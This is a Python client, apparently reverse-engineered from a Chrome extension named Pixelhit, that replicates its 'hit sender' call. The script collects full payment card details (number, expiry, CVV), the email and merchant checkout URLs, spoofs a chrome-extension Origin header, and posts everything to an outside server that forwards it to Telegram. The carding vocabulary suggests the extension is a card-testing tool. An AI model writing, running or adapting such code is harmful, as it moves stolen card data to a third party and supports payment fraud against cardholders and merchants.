"""
Pixelhit Extension - Hit Sender API Client

Sends requests to the hitsender.php endpoint, replicating the extension's
sendTelegramNotification() function from background.js (line 3181).

Endpoint: POST https://pixelx.eu.cc/hitsender.php
Auth: Bearer token (pixel_token from extension storage)
Content-Type: application/json

Note: Chrome extensions automatically send Origin: chrome-extension://<id>
headers on fetch requests from service workers. The server may validate this.
"""

import requests
import json
import sys
from dataclasses import dataclass, field, asdict
from typing import Optional


HIT_FORWARD_URL = "https://pixelx.eu.cc/hitsender.php"
AUTH_BASE_URL = "https://pixelx.eu.cc/xunezgoat.php"

# Chrome extension service workers auto-send this header on fetch().
# The server likely validates it. Use any plausible extension ID.
DEFAULT_EXTENSION_ORIGIN = "chrome-extension://pixelhiterextension"


@dataclass
class HitPayload:
    """Payload sent to hitsender.php.

    Fields match the JSON body in background.js sendTelegramNotification().
    The extension parses cardNumber as "card|mm|yy|cvv" (pipe-delimited)
    or accepts them individually.
    """
    chat_id: str              # Telegram user ID (pixel_user_id)
    userName: str             # Telegram display name
    card: str                 # Card number (first part of pipe-delimited string)
    mm: str                   # Expiry month
    yy: str                   # Expiry year
    cvv: str                  # CVV/CVC
    email: str = "N/A"        # Email used during checkout
    attempt: str = "1"        # Attempt number (skipped if 0 or "N/A")
    currency: str = "usd"     # Currency code
    amount: str = "0"         # Charge amount
    businessUrl: str = "N/A"  # Merchant/checkout URL
    successUrl: str = "N/A"   # Redirect URL after payment
    timeTaken: str = "N/A"    # Time taken for the hit
    tgForwardEnabled: bool = True  # Whether to forward to Telegram
    ver: str = "v1lt2"        # Version identifier


def send_hit(token: str, payload: HitPayload, extension_id: Optional[str] = None) -> requests.Response:
    """Send a hit notification to the hitsender API.

    Args:
        token: Bearer token (pixel_token from extension auth).
        payload: HitPayload with card and transaction details.
        extension_id: Chrome extension ID to spoof in Origin header.
                      If None, uses DEFAULT_EXTENSION_ORIGIN.

    Returns:
        requests.Response object.
    """
    origin = f"chrome-extension://{extension_id}" if extension_id else DEFAULT_EXTENSION_ORIGIN
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}",
        "Origin": origin,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

    body = asdict(payload)
    body["attempt"] = str(body["attempt"])

    response = requests.post(HIT_FORWARD_URL, headers=headers, json=body)
    return response


def login_start() -> dict:
    """Start Telegram login flow.

    Returns dict with session_id and bot_link.
    Open the bot_link in Telegram and press Start,
    then poll login_status() until status == 'confirmed'.
    """
    resp = requests.post(
        f"{AUTH_BASE_URL}/login/start",
        headers={"Accept": "application/json"},
        timeout=20,
    )
    resp.raise_for_status()
    data = resp.json()
    if not data.get("session_id") or not data.get("bot_link"):
        raise ValueError(f"Missing login session data: {data}")
    return data


def login_status(session_id: str) -> dict:
    """Poll Telegram login status.

    Returns dict with status ('pending'/'confirmed'), user info, and token.
    """
    resp = requests.get(
        f"{AUTH_BASE_URL}/login/status",
        params={"session_id": session_id},
        headers={"Accept": "application/json"},
        timeout=20,
    )
    resp.raise_for_status()
    return resp.json()


def verify_temp_code(code: str) -> dict:
    """Verify an OTP temp code. Returns dict with token if valid."""
    resp = requests.get(
        f"{AUTH_BASE_URL}/tempcode/verify",
        params={"code": code.strip().upper()},
        headers={"Accept": "application/json"},
        timeout=30,
    )
    resp.raise_for_status()
    return resp.json()


def validate_token(token: str) -> dict:
    """Validate an existing token. Returns user info if valid."""
    resp = requests.post(
        f"{AUTH_BASE_URL}/api/verify",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        json={"token": token},
        timeout=20,
    )
    resp.raise_for_status()
    return resp.json()


def parse_card_string(card_string: str) -> dict:
    """Parse a pipe-delimited card string into components.

    The extension uses format: "cardNumber|MM|YY|CVV"
    Example: "4111111111111111|12|25|123"
    """
    parts = card_string.split("|") if "|" in card_string else [card_string, "??", "??", "???"]
    return {
        "card": parts[0] if len(parts) > 0 else "N/A",
        "mm": parts[1] if len(parts) > 1 else "??",
        "yy": parts[2] if len(parts) > 2 else "??",
        "cvv": parts[3] if len(parts) > 3 else "???",
    }


def do_telegram_login() -> str:
    """Interactive Telegram login flow. Returns the token."""
    import time

    print("Starting Telegram login...")
    data = login_start()
    session_id = data["session_id"]
    bot_link = data["bot_link"]

    print(f"\n1. Open this link in Telegram: {bot_link}")
    print("2. Press 'Start' in the bot")
    print("3. Waiting for confirmation...\n")

    for i in range(60):
        status = login_status(session_id)
        if status.get("status") == "confirmed" and status.get("token"):
            token = status["token"]
            user = status.get("user", {})
            print(f"Login confirmed! User: {user.get('first_name', 'Unknown')}")
            print(f"User ID: {user.get('id', 'N/A')}")
            print(f"Token: {token}")
            return token
        print(f"  Polling... ({i+1}/60)", end="\r")
        time.sleep(2)

    raise TimeoutError("Login timed out after 120 seconds")


def main():
    """CLI interface for sending hit requests."""
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print("Usage:")
        print("  python hitsender.py <token>          Send a hit with existing token")
        print("  python hitsender.py --login          Login via Telegram to get token")
        print("  python hitsender.py --otp <CODE>     Login via OTP code")
        print("  python hitsender.py --validate <tok> Check if a token is valid")
        print()
        print("Example:")
        print('  python hitsender.py "your_pixel_token_here"')
        sys.exit(1)

    if sys.argv[1] == "--login":
        token = do_telegram_login()
        print(f"\nUse this token to send hits:")
        print(f'  python hitsender.py "{token}"')
        return

    if sys.argv[1] == "--otp":
        if len(sys.argv) < 3:
            print("Usage: python hitsender.py --otp <CODE>")
            sys.exit(1)
        result = verify_temp_code(sys.argv[2])
        print(json.dumps(result, indent=2))
        return

    if sys.argv[1] == "--validate":
        if len(sys.argv) < 3:
            print("Usage: python hitsender.py --validate <token>")
            sys.exit(1)
        result = validate_token(sys.argv[2])
        print(json.dumps(result, indent=2))
        return

    token = sys.argv[1]

    print("=== Pixelhit Hit Sender ===")
    print(f"Endpoint: {HIT_FORWARD_URL}")
    print()

    chat_id = input("Telegram chat_id (pixel_user_id): ").strip()
    user_name = input("userName (display name): ").strip() or "User"

    card_input = input("Card (pipe-delimited: number|MM|YY|CVV): ").strip()
    card_parts = parse_card_string(card_input)

    email = input("Email [N/A]: ").strip() or "N/A"
    attempt = input("Attempt number [1]: ").strip() or "1"
    currency = input("Currency [usd]: ").strip() or "usd"
    amount = input("Amount [0]: ").strip() or "0"
    business_url = input("Business URL [N/A]: ").strip() or "N/A"
    success_url = input("Success URL [N/A]: ").strip() or "N/A"
    time_taken = input("Time taken [N/A]: ").strip() or "N/A"
    tg_forward = input("Forward to Telegram? [Y/n]: ").strip().lower() != "n"

    payload = HitPayload(
        chat_id=chat_id,
        userName=user_name,
        card=card_parts["card"],
        mm=card_parts["mm"],
        yy=card_parts["yy"],
        cvv=card_parts["cvv"],
        email=email,
        attempt=attempt,
        currency=currency,
        amount=amount,
        businessUrl=business_url,
        successUrl=success_url,
        timeTaken=time_taken,
        tgForwardEnabled=tg_forward,
    )

    print()
    print("Sending payload:")
    print(json.dumps(asdict(payload), indent=2))
    print()

    try:
        resp = send_hit(token, payload)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text}")
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
